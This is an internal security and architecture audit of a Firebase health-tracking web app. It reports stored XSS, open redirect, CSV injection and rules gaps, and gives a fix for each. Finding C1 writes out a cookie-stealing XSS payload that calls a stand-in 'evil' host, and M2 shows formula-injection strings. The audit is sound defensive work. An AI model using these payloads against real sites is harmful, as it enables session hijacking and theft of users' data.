# Lyvoo — Full Technical & Security Audit

- **Version**: 1.0
- **Date**: 2026-07-01
- **Author**: Lead-engineer onboarding audit (reverse-engineered from source, no code changed)
- **Scope**: entire repo — static frontend (~50 HTML pages + shared JS), `functions/`, `firestore.rules`, CI/CD, and the `dashboard.html` ↔ `admin.html` ↔ Firestore system.
- **Threat model**: attacker has full browser access (DevTools, direct Firestore SDK calls, crafted URLs), may be unauthenticated, a registered client, or (for blast-radius reasoning) a compromised admin.
- **Status**: point-in-time snapshot. Do not edit after the fact; supersede with a new dated file.

> **Companion docs**: this is the *security/architecture* audit. The *product/UX* review of the same two files is `2026-07-01-dashboard-admin-holistic-review.md`; the living backlog is `docs/roadmap/dashboard-admin-backlog.md`.

---

## 0. Executive summary

The backend security model is **genuinely good**: custom-claim admin gating (no email fallback), field-locked `users/{uid}`, PII isolation (`agendamentosNutri` vs the PII-free `busySlots` mirror), atomic counters, idempotent Stripe webhook in a transaction, GDPR cascade-delete with audit trail, App Check enforced, and a CI pipeline that validates on every PR and gates production deploys behind manual approval. Secrets are handled correctly — no live secret is committed; the one real credential (`serviceAccountkey.json`) is gitignored and never entered git history.

The **frontend is where the risk concentrates**, and it is one systemic class of bug: **the app builds HTML with template-literal string interpolation and assigns it via `innerHTML`, but only escapes in a handful of places.** Both large files define an `escapeHtml()` helper and then use it inconsistently. Because the CSP necessarily carries `'unsafe-inline'` (the whole app is inline scripts), CSP provides **no** mitigation — any injected markup executes.

The highest-impact instance: an **unauthenticated** visitor can submit a waitlist entry whose `email` is an XSS payload, which the admin panel renders unescaped — turning "someone opened the Waitlist tab" into full admin-session compromise (all client health data, GDPR delete, PII exfiltration). The same class of bug also lets any registered client attack the admin (via profile name / booking fields) and lets an admin (or an attacker who has popped one) persist XSS into every client's dashboard.

None of these require exotic technique — they're `<img src=x onerror=…>` in fields the product already lets low-privilege actors write. The fixes are mostly mechanical (escape at every sink) plus two rule tightenings and one redirect-validation. Effort to close the top tier is roughly **3–4 engineer-days**.

### Findings at a glance

| ID | Severity | Title | Effort |
|----|----------|-------|--------|
| C1 | **Critical** | Unauthenticated stored XSS → admin takeover via waitlist `email` | 0.5 d |
| H1 | **High** | Authenticated stored XSS: client → admin (name / booking fields) | 1 d |
| H2 | **High** | `users/{uid}` **create** rule far weaker than **update** — clinical-field seeding | 0.5 d |
| H3 | **High** | Admin → client stored XSS (biomarkers/plan/report rendered unescaped) | 1–1.5 d |
| M1 | Medium | Open redirect (+ possible `javascript:` XSS) via `login.html?next=` | 1–2 h |
| M2 | Medium | CSV/formula injection in admin waitlist export | 1 h |
| M3 | Medium | Clickjacking — no `frame-ancestors`/XFO on auth pages | 2–4 h |
| M4 | Medium | EmailJS send-abuse / quota exhaustion / notification-content injection | config |
| M5 | Medium | `'unsafe-eval'` + whole-CDN `script-src` on 44 pages (no SRI) | 0.5–1 d |
| L1 | Low | Live service-account key at rest in working tree | trivial |
| L2 | Low | Waitlist entries overwritable by anyone (rule allows anon `update`) | 1 h |
| L3 | Low | Results-unlock business logic lives client-side (safe *today* only by data-availability) | note |
| L4 | Low | Stripe webhook ignores `payment_status`/amount | 2 h |

---

## 1. Architecture

### 1.1 Overall shape
Two decoupled layers, no build step:

- **Frontend**: ~50 hand-authored static `.html` files served by **GitHub Pages** at `lyvoo.pt` (apex via `CNAME`, `.nojekyll`). Each page is self-contained — inline `<style>` and inline `<script type="module">`. No framework, bundler, router, or shared stylesheet. Bilingual: PT canonical at repo root, EN 1:1 mirror under `en/`.
- **Backend**: **Firebase** project `lyvoo-9d54b`, region `europe-west1` — Auth, Firestore, Cloud Functions (gen-2, Node 22), plus **Stripe** (Payment Link + webhook) and **EmailJS** (client-side transactional email). **App Check** (reCAPTCHA v3) enforced in prod.

### 1.2 Technologies
Vanilla HTML/CSS/JS; Firebase Web SDK **10.12.2** loaded as ES modules from the gstatic CDN; Inter font (Google Fonts); `firebase-admin ^13`, `firebase-functions ^7.2.5`, `stripe ^16` in Functions; jsPDF-style PDF generation + EmailJS from `cdn.jsdelivr.net`/`cdnjs.cloudflare.com`. Tooling (backend only): ESLint 9 flat config, Prettier 3, `@firebase/rules-unit-testing`, `firebase-functions-test`. HTML/CSS are neither linted nor formatted (`.prettierignore` excludes `*.html`).

### 1.3 Routing & page relationships
File-based; URL ↔ file 1:1, no router. Language switch = link to localized sibling (`registar.html` ↔ `en/register.html`). In-page navigation uses anchors (`#atlas`, `#planos`, `#faq`). Three tiers of pages:
1. **Marketing** (index, `/modulos/*`, ciencia, como-funciona, equipa, privacidade, termos, 404) — pure static, **no Firebase**.
2. **Auth entry** (login, registar) — Firebase Auth only.
3. **App** (dashboard, admin, contacto) — Firebase Auth + Firestore (+ EmailJS on contacto).

`ciencia.html`/`en/science.html` share `science.css`; `como-funciona.html`/`en/how-it-works.html` share `how-it-works.css`. Every other page inlines its own CSS (real per-page drift — do not assume interchangeable).

### 1.4 State management & storage
No state library. Client state = DOM + **live Firestore reads** (`onSnapshot`) + a little `localStorage` (`lyvoo_cookies`, `lyvoo_lang`, `APPCHECK_DEBUG_TOKEN` on localhost only). The dashboard renders from `users/{uid}` + its subcollections; the admin renders a paginated user list + the currently-open user's doc.

### 1.5 APIs
- **Firestore** (direct from browser, gated by rules + App Check).
- **Cloud Functions**: `stripeWebhook` (HTTP), `syncBusySlots` (Firestore trigger), `assignClienteId` (Firestore trigger), `backfillBusySlots` (callable, admin), `eliminarUtilizadorRGPD` (callable, admin).
- **Stripe** Checkout via a fixed Payment Link (`dashboard.html:6143`), `client_reference_id = uid`.
- **EmailJS** client-side `send()` for contact/waitlist/marketing-consent notifications.

### 1.6 Authentication
Firebase Auth (email/password + Google). **Google uses `signInWithPopup` on desktop *and* mobile** — deliberate: the site (`lyvoo.pt`) and Firebase `authDomain` (`lyvoo-9d54b.firebaseapp.com`) are different origins, so `signInWithRedirect` breaks on mobile Safari (documented inline at `login.html:433`). `login.html` role-routes by reading the `admin` claim; `admin.html`/`dashboard.html` each re-check auth server-side-of-truth via `getIdTokenResult(true)`.

### 1.7 Authorization
- **Admin = custom claim `{admin:true}` only** (set via gitignored `set-admin-claims.js`). No email fallback. Enforced in both `firestore.rules` (`request.auth.token.admin == true`) and the two admin callables.
- **Client data** = owner-scoped rules (`request.auth.uid == uid`) + **field-locks** so a client can't self-escalate `estado`, `plano`, `resultados`, etc.
- Client-side gates (`access-denied` panel, results unlock by `estado`) are **UX only**; the real gate is rules. This is the correct posture.

### 1.8 Admin & dashboard workflows, data flow
See §4 for the full map. In short: `admin.html` writes fields on `users/{uid}` (+ subcollections + `agendamentosNutri`), `dashboard.html` reads them live. The only automatic state transition is Stripe `1→2`; everything else (`2→3→4`, reassessment `5→6→7`, results, plans, bookings) is manual admin action. Client→admin signaling rides on **non-locked** fields (`respostaCliente`, `consultaCancelada`, `kitDevolvido`, `pedidoEliminacao`) that the admin inbox aggregates in real time.

---

## 2. Project structure

### 2.1 What the important files do
- **`lyvoo-firebase.js`** — Firebase init (App, Auth, Firestore, App Check). Imported by the 8 authenticated pages. Contains the *public* web config (apiKey etc. — not secrets) and the reCAPTCHA v3 **site** key (public). App Check debug-token handling is localhost-gated and correctly avoids hardcoding.
- **`prelaunch.js`** — single kill-switch (`PRELAUNCH=true`). Hides login links, rewrites register/dashboard CTAs to the waitlist, masks structured price blocks (`.hero-price-wrap`/`.sp-price-wrap`) and any `€NNN/ano|year` text via a `TreeWalker`. Loaded on ~48 pages.
- **`mobile-nav.js`** — builds the hamburger menu on secondary pages by cloning `<ul.nav-links>` (uses `cloneNode`, no user data — safe).
- **`cookie-banner.js`** — RGPD consent banner/modal; `innerHTML` only of a static string dictionary (safe). Exposes `window.LyvooCookies`.
- **`scroll-top.js`** — passive-scroll "back to top" button.
- **`functions/index.js`** — all Cloud Functions (see §1.5).
- **`firestore.rules`** — the real security boundary (see §3.2, §5).
- **`dashboard.html`** (~6,250 lines) / **`admin.html`** (~3,275 lines) — the two apps; each ~200–400 KB single files with inline CSS/JS.
- **`.github/workflows/firebase-deploy.yml`** — validate-always / deploy-on-approval pipeline. Well-constructed.
- **`set-admin-claims.js` + `serviceAccountkey.json`** — gitignored local admin scripts. Present in the working tree; **never committed** (verified: `BEGIN PRIVATE KEY` never appears in history).

### 2.2 How pages communicate
Pages don't share runtime state — they share **Firestore collections** and **URL conventions**. `login.html?next=<page>` carries the post-login destination; `dashboard.html` hands off to Stripe with `client_reference_id`; `admin.html` and `dashboard.html` are coupled purely through the `users/{uid}` document shape (see §4). There is no message bus, no shared module of DTOs — the "contract" between admin and dashboard is an **implicit, un-typed field convention** duplicated in both files.

### 2.3 Duplicated code (the dominant structural issue)
- **Design tokens, nav, footer, `.fade` reveal, mobile-menu pattern, and the entire CSP meta** are copy-pasted into every one of ~50 files (×2 for PT/EN). A change to shared chrome must be repeated ~100 times.
- **`escapeHtml()` is defined twice** (identical) in `dashboard.html:2859` and `admin.html:1071`, and a second ad-hoc variant exists at `dashboard.html:3054`.
- **District→concelho `<select>` population** logic is duplicated (dashboard + admin).
- The **`users/{uid}` field contract** is duplicated as reader (dashboard) and writer (admin) with no shared schema.

### 2.4 Dead / latent code
- `signInWithRedirect` / `getRedirectResult` are imported and partially wired in `login.html`/`registar.html` but the code path is deliberately unused (popup is always used) — dead imports kept "just in case," worth pruning or commenting as intentional.
- CLAUDE.md/ROADMAP note ongoing **dead-CSS accumulation** from removed sections in the big index files.
- `firestore.indexes.json` defines one composite index (`users` by `arquivado,estado`) — matches the admin stats query; not dead.

### 2.5 Architectural weaknesses (structural, non-security)
1. **No shared asset layer** — the single biggest maintainability tax (see §7). Deliberately deferred (ROADMAP F1/F3).
2. **PT/EN hand-sync** — two copies of every page; `sync-check.py` only diffs the index pages.
3. **Un-typed admin↔dashboard contract** — a renamed/retyped field silently breaks the other side with no test to catch it (no frontend tests exist).
4. **HTML-as-strings rendering** — the root cause of the entire XSS class; there is no templating/escaping discipline enforced by tooling.

---

## 3. Security audit

> Ordered by severity. Each finding: what it is, how to exploit it, why it matters, and the fix. Evidence is `file:line`.

### C1 — CRITICAL: Unauthenticated stored XSS → full admin takeover (waitlist)
- **Sink**: `admin.html:3604` — `renderWaitlist()` builds `<div class="wl-email">${w.email||'-'}</div>` and assigns via `innerHTML`, **unescaped**.
- **Source**: `contacto.html:494` writes `waitlist/{idFromEmail}` with a caller-supplied `email`. `firestore.rules:167-179` allows `create` to **anyone** if `validWaitlist()` passes — which only checks `email` is a string of length 3–200. **No format check, no HTML escaping.** `<img src=x onerror=fetch('//evil/?c='+btoa(document.cookie))>` is < 200 chars.
- **Exploit**: anonymous attacker submits the payload → admin later opens **Inscrições/Waitlist** tab → attacker JS runs on `https://lyvoo.pt` inside the admin's authenticated session.
- **Blast radius**: with the admin's session the payload can read/modify **every** client's health data, call `eliminarUtilizadorRGPD`, exfiltrate all PII, write itself into other records (see H3) — effectively full data-plane compromise.
- **Why CSP doesn't save you**: `script-src` includes `'unsafe-inline'` (required by the inline-script architecture), and `img-src … https:` permits the `onerror` beacon to any host. App Check gates the *write* but only proves "a browser ran reCAPTCHA," not identity — obtainable from the real site.
- **Fix**: (a) escape `w.email` at the sink; (b) tighten the rule to a real email regex and reject anything containing `<>`"'`; (c) ideally route waitlist through a Cloud Function so unauth clients never write Firestore directly. **Effort ~0.5 day.**

### H1 — HIGH: Authenticated stored XSS, client → admin
- **Sinks (all `innerHTML`, unescaped)**:
  - Client list: `admin.html:1663,1673` interpolates `nome` (`firstName`+`lastName`) and `u.email`.
  - Inbox: `admin.html:1314-1315` interpolates the client name and `it.texto` (which embeds client-controlled `respostaCliente.hora` / `consultaCancelada.hora`, `admin.html:1248,1260`).
  - Booking rows: `admin.html:3014-3015` interpolates `a.titulo` / `a.hora`.
- **Source**: a registered client fully controls these — `firstName`/`lastName`/`email` via the profile save (`dashboard.html:6324`) or a direct `updateDoc`; `respostaCliente`/`consultaCancelada` are **not field-locked** (they're the legit client→admin signal channel); `agendamentosNutri` docs are client-writable for their own `uid`. `validProfileFields` (`firestore.rules:54`) caps length but never rejects HTML.
- **Exploit**: client sets `firstName = '<img src=x onerror=…>'` → admin opens the panel (list renders immediately) or the Inbox/Consultas → JS runs as admin.
- **Fix**: escape every client-derived value at every admin sink (there is already an `escapeHtml` in the file — apply it consistently). **Effort ~1 day** given the number of sites; pair with a lint rule or a single `h()` tagged-template helper to prevent regressions.

### H2 — HIGH: `users/{uid}` create rule is far weaker than the update rule
- **Where**: `firestore.rules:70-75`. `create` allows an owner if `estado == 1`, the doc omits 5 specific keys (`stripeSessionId,planoValidoAte,cicloAtual,clienteId,seq`), and `validProfileFields` passes. It does **not** block `resultados`, `planoAlimentar`, `suplementacao`, `relatorio`, `prioridades`, `plano`, `planoNome`, `estadoLabel`, `arquivado` — all of which the **update** rule (`ownerKeepsLockedFields`, lines 42-48) *does* lock.
- **Exploit**: a client bypasses `registar.html` and `setDoc`s their own doc at creation with fabricated `resultados.biomarcadores` / `prioridades` / a premium-looking `plano`. The financial gate holds (webhook + update-lock keep `estado` at 1), but: (a) the client fabricates their own dashboard content; (b) more seriously, those seeded biomarker fields render **unescaped** in the admin "destaque" preview (`admin.html:2195`, incl. a `title="${r.nome}"` attribute) and biomarker tables — feeding an admin XSS the moment the admin opens that client.
- **Fix**: apply the same locked-field set to `create` (a client doc should be born with *only* profile fields + `estado:1`). Add a rules test. **Effort ~0.5 day.**

### H3 — HIGH: Admin → client stored XSS (dashboard renders clinical data unescaped)
- **Where**: `dashboard.html:4740-4746, 4775, 4784-4791` (biomarker list/cards render `r.valor,r.unidade,r.referencia,r.refOtima,r.delta,r.nome`), plus supplement/plan/report renders (`~5175, 5205, 5247, 5329, 5599`). Values go straight into `innerHTML` template literals. `r.delta` in particular is a **free-text field the admin types by hand**.
- **Exploit**: a malicious admin — or, chaining C1/H1, an attacker who has already compromised an admin session — writes a payload into a client's biomarkers/plan/report; it executes in **that client's** browser, and (because admin writes many clients) can be sprayed across the whole client base for persistent multi-client XSS.
- **Why it counts despite admin being "trusted"**: it converts a *single* admin compromise into *persistent, client-side* compromise of every patient — the exact escalation the field-locks were designed to prevent in the other direction.
- **Fix**: escape all admin-authored values in the dashboard render functions (preserve intentionally-rendered inline SVG by keeping those as separate static fragments, not interpolated data). **Effort ~1–1.5 days.**

### M1 — MEDIUM: Open redirect (possible `javascript:` XSS) via `login.html?next=`
- **Where**: `login.html:293` reads `next` from the query string; `destino()` returns it verbatim (`:301`); it's used in `window.location.replace(...)` (`:313`) and `window.location.href = ...` (`:425,446`) with **no validation**.
- **Exploit**: `…/login.html?next=https://evil.tld` bounces the (already- or just-)authenticated user off-site → phishing / OAuth-relay. `next=javascript:…` may execute in some browsers.
- **Fix**: accept `next` only if it matches a same-origin relative allowlist (e.g. `/^[a-z0-9/_-]+\.html([?#].*)?$/i` and not starting `//`). **Effort ~1–2 h.**

### M2 — MEDIUM: CSV/formula injection in waitlist export
- **Where**: `admin.html:3617-3618` — `exportWaitlist()` wraps each cell as `"${v}"` but doesn't neutralize a leading `= + - @`.
- **Exploit**: attacker-controlled waitlist `email = '=HYPERLINK("http://evil","click")'` (or `=cmd|…`) executes when the admin opens the CSV in Excel/Sheets.
- **Fix**: prefix any cell beginning with `= + - @ \t \r` with a `'`, and always quote-escape `"`. **Effort ~1 h.**

### M3 — MEDIUM: Clickjacking — no `frame-ancestors` / `X-Frame-Options`
- **Where**: CSP is delivered via `<meta>` (every page), which **cannot** express `frame-ancestors`; GitHub Pages sends no `X-Frame-Options`. So `login/dashboard/admin` are framable by any origin.
- **Exploit**: overlay/clickjack a logged-in user into destructive clicks (cancel consultation, request deletion).
- **Fix**: add a tiny frame-buster (`if (self!==top) top.location=self.location`) to the auth pages, or front the site with a host/CDN that can send real headers. **Effort ~2–4 h.**

### M4 — MEDIUM: EmailJS send-abuse / quota exhaustion / notification-content injection
- **Where**: public key `P0ArQ2tRYDeYkPZuR`, `service_x9g66zr`, `template_4is6gpi` exposed in `registar.html:341,366` and `contacto.html:385,503`. The notification email body embeds user-supplied `from_name`/`mensagem` (`registar.html:371`).
- **Exploit**: anyone reads the IDs and calls EmailJS directly → spam / quota-drain / cost, and can craft the notification body (phishing content reaching the Lyvoo inbox). This is inherent to client-side EmailJS.
- **Fix**: lock "Allowed origins" + enable rate-limit/captcha in the EmailJS dashboard; longer-term move sending server-side (Cloud Function) so IDs aren't public. **Effort: config now; ~0.5 day to move server-side.**

### M5 — MEDIUM: `'unsafe-eval'` + whole-CDN `script-src`, no SRI
- **Where**: 44 pages use `script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.gstatic.com https://*.google.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com` (6 simpler pages correctly omit `unsafe-eval`+CDNs).
- **Risk**: entire public CDNs are trusted and no Subresource Integrity is used → supply-chain exposure; `'unsafe-eval'` broadens injection utility. `'unsafe-inline'` is unavoidable given the architecture (and is why the XSS findings are un-mitigated by CSP), but the CDN/eval breadth is reducible.
- **Fix**: pin the exact jsPDF/EmailJS files with SRI hashes; drop `'unsafe-eval'` if nothing needs it; scope CDN origins to specific paths. **Effort ~0.5–1 day.**

### L1–L4 (Low)
- **L1** — `serviceAccountkey.json` (a real admin private key) sits in the working tree. Correctly gitignored, **never committed**, not on the public site — but a full-admin credential at rest locally. Keep it out of the project dir or use ADC; rotate if there's any doubt about exposure. *(Verified it is not served: it's absent from `git ls-files` and GitHub Pages only serves committed files.)*
- **L2** — `firestore.rules:177` allows unauthenticated `update` on `waitlist`; since the doc id is derived from the email, anyone can overwrite any known entry or flood ids. Low impact but it's the delivery channel for C1. Drop `update` (or require the entry not already exist).
- **L3** — Results unlock (`estado 4/7`) is decided **client-side**. Safe *today* only because `resultados` isn't written until the admin sets those states; a client can already read their own doc at any `estado`. Keep results-writing strictly coupled to state so nothing leaks early.
- **L4** — `stripeWebhook` (`functions/index.js:59`) advances on any `checkout.session.completed` without checking `session.payment_status === 'paid'` or amount. The fixed Payment Link mitigates amount tampering; but enabling async/delayed payment methods later could grant a kit before capture. Add the `payment_status` guard and handle `async_payment_succeeded`.

### What's already done right (don't regress)
Custom-claim-only admin; the update-path field-lock (incl. the DA-22 addition of `resultados/planoAlimentar/suplementacao/relatorio`); PII isolation via `busySlots`; `webhookErrors`/`eliminacoesRGPD` observability; idempotent transactional webhook; `eliminarUtilizadorRGPD` refuses to delete admins; App Check enforced; CI validates the security model on every PR (16 rules + 10 functions tests) and gates prod behind manual approval; no secrets in git; chat message text **is** escaped on both sides (`dashboard.html:2922`, `admin.html:1102`).

---

## 4. Dashboard ↔ Admin relationship (reverse-engineered)

### 4.1 The dependency
There is **no direct channel** — the two files never call each other. They are coupled entirely through the **shape of `users/{uid}`** (+ subcollections + `agendamentosNutri`/`busySlots`). `admin.html` is the **writer**, `dashboard.html` is the **reader**, Firestore is the bus, and rules are the contract enforcer.

```
admin.html (writer)                 Firestore                    dashboard.html (reader)
──────────────────────────────────────────────────────────────────────────────────────
Estado do programa      →  users/{uid}.estado, estadoLabel   →  unlocks sections; timeline
Biomarcadores tab       →  users/{uid}.resultados.biomarcadores→ score ring, cards, sparklines
  + analises/{id} snapshot (history, incl. score since DA-02)  →  Δ trends, evolution charts
Plano alimentar tab     →  users/{uid}.planoAlimentar          →  meals/macros + regex insight tags
Suplementação tab       →  users/{uid}.suplementacao           →  supplement list
Relatório tab           →  users/{uid}.relatorio               →  report score/narrative/PDF
Prioridades tab (DA-07) →  users/{uid}.prioridades[]           →  Weekly Priorities (DA-08)
Consultas tab           →  agendamentosNutri/{id}, agendamentoConvite → merged consultations view
(admin reads inbox)     ←  respostaCliente/consultaCancelada/  ←  client actions (booking replies,
                            kitDevolvido/pedidoEliminacao          cancellations, kit-return, RGPD)
```

### 4.2 Every dependency, and where it can fail
1. **Field-name/shape contract is implicit and un-typed.** Rename `resultados.biomarcadores[].refAcao` in admin and the dashboard's severity model silently degrades. **No test guards this** (no frontend tests). *Sync-failure surface: high.*
2. **Score is computed live in the dashboard and never written back** (holistic score has no history) — DA-02 partially addresses this by persisting `score` into each `analises/` snapshot, but the *composite* is still client-derived. Divergence risk if the admin and dashboard scoring logic drift.
3. **`delta` is typed by the admin by hand** (`admin.html`) while the previous value sits one `analises/` read away — a manual step that can be wrong/stale (data-integrity, and the free-text field is an XSS vector, H3).
4. **Client→admin signals ride on non-locked fields** (`respostaCliente`, `consultaCancelada`, `kitDevolvido`). This is deliberate (the client must write them) but it's exactly why H1 works — those fields reach admin `innerHTML` unescaped.
5. **Two Firestore-listener graphs.** The admin runs several always-on `onSnapshot`s over `users` (`where respostaCliente.visto==false`, etc., `admin.html:1177-1199`) plus a whole-`chats` collection listener. The dashboard runs per-user listeners. If a client writes a malformed value (or a huge blob within the size caps), both sides re-render. *Sync-failure surface: a client can force admin re-renders on demand.*
6. **`busySlots` mirror can lag.** The dashboard reads availability from `busySlots` (PII-free), maintained by the `syncBusySlots` trigger. A trigger failure/cold-start delay means the client's calendar shows stale availability → double-booking window. Reconciled by `backfillBusySlots` (manual).

### 4.3 Where users can tamper
- **Directly, via the SDK/console** (rules are the only backstop): a client can `updateDoc` any non-locked field on their own doc — including the XSS-carrying `firstName`/`respostaCliente` (H1) — and can seed locked-looking fields at **create** time (H2).
- **Cannot** change `estado`/`plano`/`resultados`/… on update (field-lock holds — good), cannot read other users, cannot read `agendamentosNutri` of others (PII isolation), cannot write `busySlots`/`counters`/`webhookErrors`.

### 4.4 Business logic that lives in the client but arguably shouldn't
- **Health-score computation** (dashboard) — fine to *display* client-side, but because it drives clinical interpretation it should be computed/persisted server-side (or at least at admin-save) to guarantee admin/client agreement and history. Partially started (DA-02).
- **Biomarker severity tagging "Auto"** — the dashboard's `autoTag()` logic is the source of truth the admin can defer to; it lives in the client. Acceptable as long as it's the *same* code, but there are effectively two implementations to keep in sync.
- **Results unlock by `estado`** — UI-only (L3); safe today only by data-availability. The *authorization* is correctly in rules; the *gating UX* is client-side, which is fine.
- **Everything money/state-critical is already server-side** (webhook, counter, GDPR delete) — that part is correct.

---

## 5. Firestore rules — detailed read
Strong overall. Highlights and gaps:
- `isAdmin()`/`isOwner()` helpers, custom-claim only. ✅
- `users` **update** field-lock via `ownerKeepsLockedFields()` (15 fields incl. the DA-22 clinical set) + `validProfileFields()` length/type checks. ✅
- `users` **create** rule under-locked → **H2**. ❌
- `agendamentosNutri` owner/admin-only read; `busySlots` auth-read/no-write; `counters`/`webhookErrors`/`eliminacoesRGPD` admin-read/no-client-write; `biomarkerTemplates` admin-only. ✅
- `waitlist` create+update open to unauth with field validation but **no HTML/format constraint** → feeds **C1**; `update` open → **L2**. ⚠️
- `chats/{uid}/mensagens` owner+admin create, admin-only update/delete. ✅ (text is escaped at both render sites).

---

## 6. Performance
- **Main weight = render-blocking inline CSS** on the two ~200–400 KB index/app files, with known **dead-CSS** accumulation. Biggest single lever: extract shared CSS (also fixes §7) and prune orphans.
- **Firestore usage is mostly efficient**: admin uses cursor pagination + `getCountFromServer()` aggregates (no full-collection scans for stats), and `clienteId` numbering was moved off a full-collection read into the `assignClienteId` counter. ✅
- **But**: the admin holds **multiple always-on collection listeners** — 4× `users` where-queries + a whole-`chats` `onSnapshot` (`admin.html:1149,1177-1199`). At scale these are continuous reads and re-render `applyFilters()`/`renderInbox()` on any matching write; a client can trigger admin re-renders (see §4.2). Consider consolidating and/or debouncing.
- **Unnecessary JS**: dead `signInWithRedirect`/`getRedirectResult` paths; duplicated `escapeHtml`/district logic (§2.3).
- **Images**: only 4 raster assets, but `logo.png` (1.3 MB) and `og-image.png` (1.2 MB) are heavy for what they are — compress/resize; prefer inline SVG (already the project's convention).
- **Good patterns to keep**: `IntersectionObserver` for reveals (not scroll handlers), CSS `scroll-snap` carousels, passive scroll in `scroll-top.js`, Firebase SDK cached from CDN across pages.

---

## 7. Maintainability
- **Naming**: consistent and legible — page-scoped class prefixes (`ba-`, `bm-`, `yr-`, `biox-`, …), PT-language domain vocabulary throughout, clear function names. Good.
- **Modularity**: **low by design.** ~50 self-contained files with copy-pasted chrome (tokens/nav/footer/CSP) and two ~thousand-line inline scripts. A shared-partials/CSS system is the highest-value refactor (ROADMAP F1/F3, deliberately deferred).
- **Readability**: individual functions read well and are heavily commented (often *why*, in PT). The problem is *scale per file*, not local clarity.
- **Scalability**: data model is sound for current scale (single `users/{uid}` doc + subcollections, counters, pagination). §9 of the product review flags the right next steps (`prioridades[]` → subcollection, `clinicoAtribuido` for multi-clinician).
- **Technical debt (ranked)**: (1) inline-CSS/HTML duplication; (2) PT/EN hand-sync; (3) un-typed admin↔dashboard field contract with **zero frontend tests**; (4) HTML-as-strings rendering (the security root cause) — this one is *both* debt and vulnerability, so it should be paid down as part of the security fix (introduce one escaping/`h()` helper and route all rendering through it).

---

## 8. UX / implementation quality
- **Strengths**: cohesive premium design system; genuine accessibility care (`prefers-reduced-motion`, `aria-*` on toggles, focus states); thoughtful auth error messages in PT; the admin has real workflow infra (dirty-state indicators, per-tab save timestamps, `historicoAlteracoes` audit, inbox aggregation). The prelaunch kill-switch is elegant (one flag).
- **Inconsistencies / fragility**:
  - **Escaping is inconsistent** — chat is escaped, names/emails/bookings are not (the UX symptom of the security bug: a client named `A<b>C` renders as bold in admin).
  - **Un-typed field contract** means an admin-side rename silently blanks a dashboard section with no error — fragile and hard to notice without visual QA in both languages.
  - **Manual `delta` entry** is error-prone data entry that the system could compute.
  - **Store section** is a dead-end CTA ("unlock via chat") requiring the user to leave the interface (noted in the product review).
  - **`title="${r.nome}"`-style attribute interpolation** (`admin.html:2195`) is both an XSS vector and a sign that rendering isn't going through a safe helper.
- **Hard-to-maintain sections**: the two big inline `<script>` blocks; any change to shared nav/footer/tokens (must be repeated ~100×); PT/EN parity.

---

## 9. Prioritized remediation plan

**Phase 1 — stop the bleeding (~3–4 days).** Introduce one safe-render helper (a tagged-template `h\`\`` that escapes interpolations) in both apps and route **every** `innerHTML` sink through it, prioritizing admin sinks that render client/public data (C1, H1) then the dashboard clinical renders (H3). Lock the `users` **create** rule to match update (H2) + add a rules test. Validate the `next` redirect (M1). Neutralize CSV export (M2). *All low-risk, mechanical, individually testable.*

**Phase 2 — harden (~2–3 days).** Tighten the `waitlist` rule (email regex, drop anon `update`) and consider moving waitlist + EmailJS server-side behind a Cloud Function (closes C1's write path, M4, L2). Add a frame-buster to auth pages (M3). Add `payment_status` guard to the webhook (L4). Add SRI + trim `unsafe-eval`/CDN scope where possible (M5). Rotate/relocate the local SA key (L1).

**Phase 3 — pay down debt (post-launch, larger).** Extract shared CSS + a partials/build-free include mechanism for nav/footer/tokens/CSP (ROADMAP F1/F3); introduce a minimal typed field-contract module shared by admin/dashboard + a first frontend test around it; compress raster assets. These remove whole categories of future bugs (PT/EN drift, contract breakage) and are the real long-term win.

*Effort estimates are engineer-days for a developer familiar with this codebase; multiply for ramp-up. No code was changed in producing this audit.*
